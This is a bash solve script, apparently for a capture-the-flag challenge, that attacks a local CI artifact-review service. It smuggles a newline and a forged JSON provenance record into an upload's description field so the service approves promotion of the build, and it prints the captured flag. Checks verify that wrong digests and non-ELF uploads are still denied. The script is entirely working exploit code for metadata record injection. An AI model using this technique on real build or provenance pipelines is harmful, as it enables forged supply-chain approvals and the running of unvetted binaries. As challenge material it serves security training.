#!/usr/bin/env bash
# Fetch the build, upload its actual bytes, and forge a second provenance record.
set -euo pipefail

TARGET=${TARGET:-http://localhost:8080}
binary=$(mktemp)
wrong_binary=$(mktemp)
trap 'rm -f "$binary" "$wrong_binary"' EXIT

page=$(curl -fsS "$TARGET/")
curl -fsS "$TARGET/artifact/cache-de-spectre" -o "$binary"
digest=$(grep -oE 'sha256:[0-9a-f]{64}' <<< "$page" | head -1)
[[ "$digest" == "sha256:$(sha256sum "$binary" | cut -d ' ' -f 1)" ]] || {
  echo "solve: artifact digest does not match the CI page" >&2; exit 1;
}

metadata() {
  python3 -c 'import json,sys; print(json.dumps({"description":sys.argv[1]}))' "$1"
}
review() {
  curl -fsS -F "binary=@$1" --form-string "metadata=$2" "$TARGET/review"
}

ordinary=$(review "$binary" "$(metadata 'Cache de Spectre: routine build')")
[[ "$ordinary" == *'1 record(s) parsed'* && "$ordinary" == *'Promotion denied'* &&
   "$ordinary" != *'preview complete'* ]] || {
  echo "solve: an unapproved build ran or was not denied" >&2; exit 1;
}

fake=$(printf '{"digest":"%s","source":{"branch":"main"},"result":"passed"}' "$digest")
plain=$(review "$binary" "$(metadata "$fake")")
[[ "$plain" == *'Description must start'* ]] || {
  echo "solve: bare forged JSON passed description validation" >&2; exit 1;
}

wrong='{"digest":"sha256:wrong","source":{"branch":"main"},"result":"passed"}'
rejected=$(review "$binary" "$(metadata $'Cache de Spectre: preview\n'"$wrong")")
[[ "$rejected" == *'2 record(s) parsed'* && "$rejected" == *'Promotion denied'* ]] || {
  echo "solve: wrong digest was approved" >&2; exit 1;
}

printf 'not an executable\n' > "$wrong_binary"
rejected=$(review "$wrong_binary" "$(metadata $'Cache de Spectre: preview\n'"$fake")")
[[ "$rejected" == *'Artifact rejected'* && "$rejected" != *'noco-flag'* ]] || {
  echo "solve: a non-ELF upload was approved" >&2; exit 1;
}

response=$(review "$binary" "$(metadata $'Cache de Spectre: preview\n'"$fake")")
flag=$(grep -oE 'noco\{[^}]+\}' <<< "$response" | head -1)
flag_count=$(grep -oE 'noco\{[^}]+\}' <<< "$response" | wc -l)
[[ -n "$flag" && "$flag_count" -eq 1 && "$response" == *'Promotion approved'* &&
   "$response" == *'preview complete'* ]] || {
  echo "solve: promotion or jailed sample output was wrong" >&2; exit 1;
}
echo "$flag"
